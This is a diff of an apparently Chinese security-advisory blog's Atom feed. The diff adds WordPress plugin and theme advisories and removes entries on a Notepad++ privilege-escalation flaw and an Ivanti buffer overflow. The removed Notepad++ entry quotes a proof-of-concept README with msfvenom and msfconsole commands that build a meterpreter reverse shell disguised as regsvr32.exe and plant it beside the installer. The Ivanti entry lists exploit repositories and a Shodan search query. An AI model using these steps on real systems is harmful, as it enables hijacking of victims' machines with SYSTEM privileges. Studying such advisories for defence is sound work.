@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-27T09:45:14.214Z</updated>
+  <updated>2025-06-27T10:00:08.887Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,54 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>The Simple Payment plugin for WordPress is vulnerable to Authentication Bypass in versions 136</title>
+    <link href="http://example.com/2025/06/27/github_2201132127/"/>
+    <id>http://example.com/2025/06/27/github_2201132127/</id>
+    <published>2025-06-27T10:00:08.888Z</published>
+    <updated>2025-06-27T10:00:08.887Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-x3mp-x433-h32f">https://github.com/advisories/GHSA-x3mp-x433-h32f</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6688">https://nvd.nist.gov/vuln/detail/CVE-2025-6688</a></p></li><li><p><a href="https://plugins.trac.wordpress.org/changeset/3318371/simple-payment/tags/2.3.9/simple-payment-plugin.php">https://plugins.trac.wordpress.org/changeset/3318371/simple-payment/tags/2.3.9/simple-payment-plugin.php</a></p></li><li><p><a href="https://www.wordfence.com/threat-intel/vulnerabilities/id/8b4e2f87-e3ad-4f1b-b647-f5e5a49f691b?source=cve">https://www.wordfence.com/threat-intel/vulnerabilities/id/8b4e2f87-e3ad-4f1b-b647-f5e5a49f691b?source=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-x3mp-x433-h32f">https://github.com/advisories/GHSA-x3mp-x433-h32f</a></p></li></ul><p><strong>描述：</strong></p><p>The Simple Payment plugin for WordPress is vulnerable to Authentication Bypass in versions 1.3.6 to 2.3.8. This is due to the plugin not properly verifying a user’s identity prior to logging them in through the create_user() function. This makes it possible for unauthenticated attackers to log in as administrative users.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-x3mp-x433-h32f&quot;&gt;https://github.com/advisories/GHSA-x3mp-x433-h32f&lt;/a&gt;&lt;/p</summary>
+      
+    
+    
+    
+    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
+    
+    
+    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>The DWT - Directory &amp; Listing WordPress Theme theme for WordPress is vulnerable to privilege</title>
+    <link href="http://example.com/2025/06/27/github_1294300802/"/>
+    <id>http://example.com/2025/06/27/github_1294300802/</id>
+    <published>2025-06-27T10:00:05.144Z</published>
+    <updated>2025-06-27T10:00:05.143Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-r95m-rm59-p2hp">https://github.com/advisories/GHSA-r95m-rm59-p2hp</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12827">https://nvd.nist.gov/vuln/detail/CVE-2024-12827</a></p></li><li><p><a href="https://themeforest.net/item/dwt-listing-directory-listing-wordpress-theme/21976132">https://themeforest.net/item/dwt-listing-directory-listing-wordpress-theme/21976132</a></p></li><li><p><a href="https://www.wordfence.com/threat-intel/vulnerabilities/id/51fc7d47-2a0f-4713-9859-120321aa32dc?source=cve">https://www.wordfence.com/threat-intel/vulnerabilities/id/51fc7d47-2a0f-4713-9859-120321aa32dc?source=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-r95m-rm59-p2hp">https://github.com/advisories/GHSA-r95m-rm59-p2hp</a></p></li></ul><p><strong>描述：</strong></p><p>The DWT - Directory &amp; Listing WordPress Theme theme for WordPress is vulnerable to privilege escalation via account takeover in all versions up to, and including, 3.3.6. This is due to the plugin not properly checking for an empty token value prior to resetting a user’s password through the dwt_listing_reset_password() function. This makes it possible for unauthenticated attackers to change arbitrary user’s passwords, including administrators, and leverage that to gain access to their account.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-r95m-rm59-p2hp&quot;&gt;https://github.com/advisories/GHSA-r95m-rm59-p2hp&lt;/a&gt;&lt;/p</summary>
+      
+    
+    
+    
+    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
+    
+    
+    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
+    
+  </entry>
   
   <entry>
     <title>Skyvern SSTI Remote Code Execution</title>
@@ -476,59 +524,6 @@
     <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
     
     <category term="服务端模板注入" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Notepad++ 本地权限提升漏洞</title>
-    <link href="http://example.com/2025/06/26/github_3093845328/"/>
-    <id>http://example.com/2025/06/26/github_3093845328/</id>
-    <published>2025-06-26T18:45:16.444Z</published>
-    <updated>2025-06-26T18:45:16.444Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Notepad++ 本地权限提升漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49144</li></ul><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2025-49144是Notepad++ v8.8.1及之前版本安装程序中发现的一个高严重性本地权限提升漏洞。此漏洞源于安装过程中对可执行文件搜索路径的控制不足，允许攻击者通过在安装程序同一目录下放置恶意可执行文件来获取SYSTEM级别的权限。</p><p><strong>产品厂商：</strong> Notepad++</p><p><strong>产品名称：</strong> Notepad++</p><p><strong>影响版本：</strong> version &lt;&#x3D; 8.8.1</p><p><strong>来源：</strong> <a href="https://github.com/assad12341/notepad-v8.8.1-LPE-CVE-">https://github.com/assad12341/notepad-v8.8.1-LPE-CVE-</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2025-49144_PoC-main.zip</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="notepad-v8-8-1-LPE-CVE"><a href="#notepad-v8-8-1-LPE-CVE" class="headerlink" title="notepad-v8.8.1-LPE-CVE-"></a>notepad-v8.8.1-LPE-CVE-</h2><p>CVE-2025-49144 * Notepad++ v8.8.1 * SYSTEM-level POC</p><p><img src="https://github.com/user-attachments/assets/b828c797-8025-4d44-8bbb-31dfd5887a59" alt="image"></p><p>📌 CVE-2025-49144 is a high-severity local privilege escalation vulnerability found in the Notepad++ v8.8.1 and prior version installers. This vulnerability stems from uncontrolled executable search path behavior during installation, allowing a local attacker to gain SYSTEM-level privileges by placing malicious executables in the same directory as the installer.</p><p>⚙️ How the CVE works – Step-by-Step:</p><p>🧱 1. What went wrong in the installer?</p><p>The Notepad++ installer (before v8.8.2) calls regsvr32.exe to register some components — but it does this without giving the full path (like C:\Windows\System32\regsvr32.exe).</p><p>Instead, it just runs:</p><p>regsvr32.exe some_dll<br>📂 2. Windows search path behavior: When an executable is launched without a full path, Windows uses a specific search order to find the file:</p><p>The folder from which the application was launched (e.g., Downloads)</p><p>The system folder (System32)</p><p>The Windows folder</p><p>Current working directory</p><p>Paths in PATH environment variable</p><p>So, if a fake regsvr32.exe is placed in the same folder as the installer (e.g., Downloads), Windows will use it before the real one.</p><p>💣 3. Exploitation:</p><ul><li><p>Attacker places a malicious regsvr32.exe in the same folder as the legitimate Notepad++ installer (e.g., the victim’s Downloads folder).</p></li><li><p>Victim runs the installer (thinking it’s safe).</p></li><li><p>Installer calls regsvr32.exe, but ends up executing the malicious one from the same folder — with SYSTEM privileges (because installers typically request admin permissions).</p></li><li><p>The attacker’s payload is now running as NT AUTHORITY\SYSTEM.<br>⚙️ Steps to Reproduce:</p></li></ul><p>Get shell code:<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<your-ip> LPORT&#x3D;4444 -f c &gt; shellcode.txt<br>Download the file “regsvr32_loader.c” and edit it.<br>Paste entire shellcode from shellcode.txt in the mentioned comment.<br>Compile to regsvr32.exe:<br>x86_64-w64-mingw32-gcc regsvr32_loader.c -o regsvr32.exe -mwindows<br>Deploy a meterpreter listner:<br>msfconsole<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>set LHOST 192.168.1.9<br>set LPORT 4444<br>run<br>Download a vulnerable version of Notepad++ i.e. prior to 8.8.1 as 8.8.1 is now auto-updated.For PoC I have used Notepad++ v8.6.8<br>Move the file “regsvr32.exe” into the windows system in the same folder of the notepad++ installer, probably in the Downloads folder.<br>Complete the Installation of the Notepad++ installer.<br>Note: This is a PoC thus tested with Windows defender and real time protection disabled.</p><p>✅ Mitigation</p><p>Users and administrators should:</p><p>Upgrade to Notepad++ v8.8.2 or later</p><p>Restrict software installation to trusted admins</p><p>Use AppLocker, WDAC, or Software Restriction Policies (SRP) to:</p><p>Block execution from user-writeable folders (e.g., Downloads)<br>Prevent execution of untrusted binaries like regsvr32.exe from unauthorized paths<br>Enforce code signing for executables<br>Security teams should regularly audit install paths, monitor write permissions, and observe behavior during installer execution to reduce attack surface.</p><p>🏷️ License<br>MIT License — Free for educational, research, and defensive purposes only.</p><p>🤝 Contributing<br>Pull Requests welcome — improve detection, add features, or suggest fixes.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Notepad++ 本地权限提升漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Ivanti Buffer Overflow Vulnerability</title>
-    <link href="http://example.com/2025/06/26/github_2121782117/"/>
-    <id>http://example.com/2025/06/26/github_2121782117/</id>
-    <published>2025-06-26T17:30:21.969Z</published>
-    <updated>2025-06-26T17:30:21.966Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Ivanti Buffer Overflow Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-0282</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Ivanti Connect Secure &lt; 22.7R2.5、Ivanti Policy Secure &lt; 22.7R1.2以及Ivanti Neurons for ZTA gateways &lt; 22.7R2.3中存在一个基于栈的缓冲区溢出漏洞，这是由于不当的输入处理导致的，允许远程未认证的攻击者通过发送精心构造的请求执行任意代码。</p><p><strong>产品厂商：</strong> Ivanti</p><p><strong>产品名称：</strong> Ivanti Connect Secure, Ivanti Policy Secure, Ivanti Neurons for ZTA gateways</p><p><strong>影响版本：</strong> Ivanti Connect Secure &lt; 22.7R2.5, Ivanti Policy Secure &lt; 22.7R1.2, Ivanti Neurons for ZTA gateways &lt; 22.7R2.3</p><p><strong>搜索语法：</strong> http.title:”ivanti connect secure”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12130">https://github.com/projectdiscovery/nuclei-templates/issues/12130</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Ivanti Connect Secure &lt; 22.7R2.5, Ivanti Policy Secure &lt; 22.7R1.2, and Ivanti Neurons for ZTA gateways &lt; 22.7R2.3 contain a stack-based buffer overflow caused by improper input handling, letting remote unauthenticated attackers execute arbitrary code, exploit requires sending crafted requests.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day">https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day</a></li><li><a href="https://github.com/sfewer-r7/CVE-2025-0282">https://github.com/sfewer-r7/CVE-2025-0282</a></li><li><a href="https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/">https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/</a></li><li><a href="https://github.com/punitdarji/Ivanti-CVE-2025-0282">https://github.com/punitdarji/Ivanti-CVE-2025-0282</a></li><li><a href="https://vulncheck.com/xdb/043030d6caa4">https://vulncheck.com/xdb/043030d6caa4</a></li><li><a href="https://github.com/44xo/CVE-2025-0282">https://github.com/44xo/CVE-2025-0282</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:44xo&#x2F;CVE-2025-0282.git</li><li><a href="https://github.com/AdaniKamal/CVE-2025-0282">https://github.com/AdaniKamal/CVE-2025-0282</a></li><li><a href="https://vulncheck.com/xdb/858b463ecabe">https://vulncheck.com/xdb/858b463ecabe</a></li><li><a href="https://github.com/almanatra/CVE-2025-0282">https://github.com/almanatra/CVE-2025-0282</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:almanatra&#x2F;CVE-2025-0282.git</li><li><a href="https://github.com/Hexastrike/Ivanti-Connect-Secure-Logs-Parser">https://github.com/Hexastrike/Ivanti-Connect-Secure-Logs-Parser</a></li><li><a href="https://vulncheck.com/xdb/d343e6784986">https://vulncheck.com/xdb/d343e6784986</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:sfewer-r7&#x2F;CVE-2025-0282.git</li><li><a href="https://github.com/watchtowrlabs/CVE-2025-0282">https://github.com/watchtowrlabs/CVE-2025-0282</a></li><li><a href="https://github.com/rxwx/pulse-meter">https://github.com/rxwx/pulse-meter</a></li><li><a href="https://github.com/AnonStorks/CVE-2025-0282-Full-version">https://github.com/AnonStorks/CVE-2025-0282-Full-version</a></li><li><a href="https://github.com/absholi7ly/CVE-2025-0282-Ivanti-exploit">https://github.com/absholi7ly/CVE-2025-0282-Ivanti-exploit</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-ivanti-connect-secure"><a href="#Shodan-Query-http-title-ivanti-connect-secure" class="headerlink" title="Shodan Query: http.title:&quot;ivanti connect secure&quot;"></a>Shodan Query: <code>http.title:&quot;ivanti connect secure&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Ivanti Buffer Overflow Vulnerability&lt;/p</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
     
   </entry>
   
